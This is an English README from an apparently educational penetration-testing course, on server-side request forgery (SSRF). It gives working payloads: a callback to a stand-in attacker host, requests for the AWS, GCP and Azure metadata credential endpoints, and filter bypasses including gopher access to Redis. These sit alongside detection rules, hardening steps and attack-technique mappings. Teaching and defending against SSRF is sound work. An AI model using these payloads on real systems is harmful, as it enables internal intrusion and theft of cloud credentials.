> **English** | [Italiano](README.md)

# SSRF - Server-Side request forgery

> - **Phase:** Web exploitation - OWASP A10:2021 Server-Side Request Forgery
> - **Visibility:** Medium - outbound requests from the server toward attacker-chosen destinations; blind variants are confirmed via an out-of-band callback
> - **Prerequisites:** an endpoint that fetches or reaches a user-supplied (even indirectly) URL/host: import-from-URL, webhook, link previews, proxy, PDF generators, remote-image parsers
> - **Nature of the document:** methodology + practical payloads for a lab environment. Example values (169.254.169.254, internal hosts); no fabricated Finding ID (next `WEB-016`, to assign in lab).

- Objective: make the server issue requests toward internal resources or toward the cloud provider's metadata, turning the web app into a proxy into the internal network and, in the cloud, into a direct path to credential theft.

---

## Executive summary

SSRF occurs when an application issues a network request toward a destination the attacker can control. The
server, being "trusted" on the internal network, reaches things the attacker could not from outside: services
on `localhost`, internal databases and panels that are not exposed, and - especially in the cloud - the
instance metadata endpoint (`169.254.169.254`), which returns the temporary credentials of the role associated
with the machine.

The impact ranges from simple internal reconnaissance (port scan, access to unauthenticated services) up to
`Critical` when SSRF reaches the cloud metadata and steals an IAM token: from there you escalate in the cloud
(see module 10). It is the vector that links web security and cloud security, and the reason it became its own
category in the OWASP Top 10 (A10:2021).

## Operational context (why, before how)

SSRF is sought wherever the server "goes and fetches something" from input: URL fields, webhooks, link previews,
conversions (HTML-to-PDF, remote images), proxies and importers. The operational decision is to distinguish
in-band SSRF (the remote response returns in the body: immediate reconnaissance) from blind SSRF (no content in
the response: confirmed with an OOB callback toward a controlled server). The highest-value target, in the
cloud, is always the metadata endpoint.

## Execution / commands

### Phase 1 - confirmation (out-of-band callback)

You point the parameter to a controlled host and observe the incoming request:

```bash
# vulnerable parameter pointed at your own listener / collaborator
url=http://attacker.lab:8000/ssrf-probe
# the server makes the request -> it arrives at the listener: SSRF confirmed (even blind)
```

### Phase 2 - access to internal services

```bash
url=http://127.0.0.1:8080/        # panels/services bound to localhost
url=http://127.0.0.1:6379/        # redis, memcached and other unauthenticated internal services
url=http://169.254.169.254/       # cloud metadata endpoint (see Phase 3)
```

### Phase 3 - cloud metadata (credential theft)

```bash
# AWS IMDSv1 (if IMDSv2 is not enforced): lists and extracts the instance IAM role credentials
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# GCP: requires the header Metadata-Flavor: Google (when the app allows it / via gopher or header injection)
url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure IMDS: header Metadata: true
url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

Illustrative output (representative, token redacted):

```
{"Code":"Success","AccessKeyId":"ASIA...","SecretAccessKey":"****","Token":"****"}   <-- temporary IAM credentials
```

### Common filter bypasses

```bash
127.0.0.1  ->  2130706433 (decimal)  ->  0x7f000001 (hex)  ->  127.1  ->  [::1]   # alternative representations
http://attacker.lab/redirect?to=http://169.254.169.254/   # open redirect toward the internal target
http://169.254.169.254.nip.io/                            # DNS that resolves to the internal IP
gopher://127.0.0.1:6379/_<redis commands>                 # gopher to talk to non-HTTP services (SSRFmap/Gopherus)
```

## Analysis of results

A received OOB callback confirms the SSRF (even when the response shows nothing). Access to `localhost` or
internal services demonstrates reconnaissance; retrieving IAM credentials from the metadata raises the severity
to `Critical` (potential control of the cloud account). If the server enforces a strict destination allowlist or
blocks metadata access (IMDSv2 with hop limit, egress filtering), the vector is closed and the finding is
reduced.

### Theoretical analysis

SSRF arises from the implicit trust in network position: the server is inside the perimeter, so it can reach
what the outside cannot. The attacker "lends" their intent to the server, which acts as a confused deputy: it
performs a request legitimate in form but attacker-chosen in destination. The countermeasure is not filtering
"bad URLs" (bypassable with encoding/redirect/DNS) but flipping the model: an explicit allowlist of permitted
destinations, and removing the network layer's implicit privilege (egress filtering, IMDSv2). It links to the
general theme of confusion between data and destination.

## Remediation (blue team)

**Detection (WAF/SIEM).**
- Outbound requests from the web server toward `169.254.169.254`, `localhost`/`127.0.0.1`, or private IPs.
- Parameters containing URLs, IPs in alternative forms (decimal/hex), unexpected schemes (`gopher://`, `file://`).
- Traffic toward the metadata endpoint originating from application processes.

**Hardening.**
- Explicit allowlist of destinations; never pass a raw user URL to an HTTP client.
- Block unnecessary schemes (`file`, `gopher`, `dict`) and internal/metadata destinations.
- Cloud: enforce IMDSv2 (token required) with hop limit 1; egress filtering from the application subnet.
- Resolve the name and validate the final IP (anti-DNS-rebinding), not just the URL string.

---

## Real-world scenario: post-exploitation projection

> Applies to the "SSRF toward metadata / internal services" outcome (severity High/Critical).

### Attacker perspective (red team)

**Starting point:** an endpoint that fetches a user-supplied URL, with SSRF confirmed (Phase 1).

**Immediate next step:** point the endpoint at the cloud metadata endpoint and extract the instance role's IAM
credentials.

**Projected kill chain:**

```
Endpoint vulnerable to SSRF
        |
        v
SSRF -> 169.254.169.254 -> temporary IAM credentials of the role
        |
        v
Use of the token with the AWS/Azure/GCP CLI (access to the role's services)
        |
        v
Enumeration and escalation in the cloud (see module 10): S3, secrets, new resources
```

**Potential impact:** from a web vulnerability to (partial or total) control of the cloud account, without ever
directly touching the machine. On an internal network, SSRF enables reconnaissance and access to unexposed
services.

**Typical monetization vectors:** data theft from reached buckets/DBs; abuse of cloud resources (cryptomining);
persistence in the tenant.

### Defender perspective (blue team)

**Detection:** web server requests toward metadata/internal IPs; URL parameters with obfuscated IPs or unexpected
schemes.

**Indicators of Compromise (IoC):**
- Connections from the web process toward `169.254.169.254` or internal hosts.
- Parameters with `gopher://`/`file://`, IPs in decimal/hex, domains resolving to private IPs.
- Cloud API calls with the instance role credentials from unexpected sources.

**Containment:** block the pattern via WAF; immediately rotate the potentially exposed role credentials; verify
the actions performed with that token.

**Eradication and hardening:** destination allowlist; IMDSv2; egress filtering; resolved-IP validation.

**Defensive lesson:** SSRF shows that network position is not a security guarantee. In the cloud, an SSRF that
on-premise was "only" internal reconnaissance becomes credential theft: the same vulnerability changes severity
with the context.

---

## Reference tools

| tool | type | technique/access | main use case |
| :--- | :--- | :--- | :--- |
| `Burp Suite` (collaborator) | proxy/scanner | web - active | intercepts parameters and confirms blind ssrf via oob callback |
| `curl` | http client | cli - active | manual sending of requests and testing of ip representations |
| `SSRFmap` | exploit tool | cli - active | automation of ssrf exploitation (metadata, gopher, port scan) |
| `Gopherus` | payload generator | cli - active | generates `gopher://` payloads to talk to internal redis/mysql/smtp |

## Methodology notes

In a real lab (an app with import-from-URL or an OWASP target) the data to document as a finding: the OOB
confirmation, the internal services reached and any credential retrieval from the metadata. Real credentials
must be treated as sensitive data and redacted in the report.

## MITRE ATT&CK mapping

| tactic | technique | mitre id | action description |
| :--- | :--- | :--- | :--- |
| initial access | exploit public-facing application | `T1190` | exploitation of the endpoint that issues requests toward attacker-controlled destinations. |
| credential access | unsecured credentials: cloud instance metadata api | `T1552.005` | retrieval of iam credentials from the metadata endpoint via ssrf. |
| discovery | network service discovery | `T1046` | use of ssrf to scan unexposed internal services. |

---

## Links to other findings

| source | this technique | effect |
| :--- | :--- | :--- |
| [xxe](<../xxe (XML External Entity)/README.en.md>) | ssrf | xxe can be a vector for ssrf (external entity toward the metadata) |
| ssrf (iam credentials) | [10-cloud-security](<../../../10-cloud-security (Cloud&Modern)/README.en.md>) | the stolen token opens enumeration and escalation in the cloud |
| ssrf | [secure-coding-lab](<../../06-secure-coding-lab (Defense)/README.en.md>) | the remediation (allowlist, imdsv2) links to the secure coding lab |

---

> **Note:** Educational content. The payloads are functional and must be executed only on owned applications or with explicit authorization, in a lab environment. IPs/hosts are example values; credentials and tokens are illustrative/redacted.
